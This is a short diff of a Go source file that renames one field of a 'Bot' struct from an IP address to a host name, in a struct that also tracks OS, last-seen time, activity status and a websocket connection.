@@ -12,7 +12,7 @@ type Bot struct {
 
 	ID       int    `json:"id"`
 	OS       string `json:"os"`
-	IP       string `json:"ip"`
+	HostName string `json:"hostname"`
 	LastSeen time.Time
 	Active   bool
 	con      *websocket.Conn
